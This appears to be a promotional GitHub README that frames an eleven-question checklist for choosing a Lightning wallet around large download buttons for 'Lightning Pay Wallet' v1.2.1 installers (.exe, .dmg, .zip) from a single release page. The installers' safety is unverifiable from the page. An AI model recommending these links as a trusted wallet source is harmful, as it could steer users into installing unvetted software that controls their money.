<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# The best Lightning wallet: the checklist to judge one

Eleven questions that separate a wallet you can rely on from one you merely like.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

"Best" is a claim about fit. This is the checklist to run against any wallet, in order, before you put
money in it.

## Custody and recovery

1. **Who holds the keys?** You, or the company. Everything else follows from this.
2. **Does the phrase restore the whole wallet?** On-chain funds alone is a partial answer.
3. **Is there a channel backup?** If the wallet has channels and no backup, ask what a restore returns.
4. **Have you tested a restore?** Before funding, on the same machine. A phrase never used is a hope.

## Money and limits

5. **What does it cost to open a channel?** That is the real first-payment cost.
6. **What happens to a balance that will not empty?** A reserve is normal; an unexplained deduction is
   not.
7. **Can you see capacity?** If not, you cannot predict why a payment will fail.

## Operations

8. **Where does the download come from?** A release page you can name, not a search ad.
9. **What does a failure tell you?** "Payment failed" is useless; routing, expiry and offline are
   actionable.
10. **Does it run on your platform?** The same brand may not.
11. **What happens when the maker stops?** Non-custodial funds survive; a hosted balance does not.

## How to weigh the answers

A wallet that fails 1, 2 or 4 is not a candidate for savings, whatever its feature list. A wallet that
fails 5 or 7 is fine for small amounts and frustrating for larger ones. A wallet that fails 11 is a
service, not a wallet.

## The mistake this prevents

Most people choose by interface and discover custody on the worst day. Running the list takes ten
minutes and answers the questions that actually cost money.

## Questions people ask

### Is this checklist specific to Lightning?

No, but questions 3, 5 and 7 only apply to Lightning wallets.

### Do I need all eleven?

For a spending balance, four matter. For savings, all of them.

### What is the single most important?

Tested recovery. It catches more real losses than any other item.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/best-lightning-wallet-compared.md">Best Bitcoin Lightning wallets compared, including this one</a>
- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/which-wallets-support-lightning.md">Which wallets support Lightning, compared by what they actually do</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/safest-bitcoin-wallets-and-hardware.md">The safest bitcoin wallets, and whether hardware fits Lightning</a>

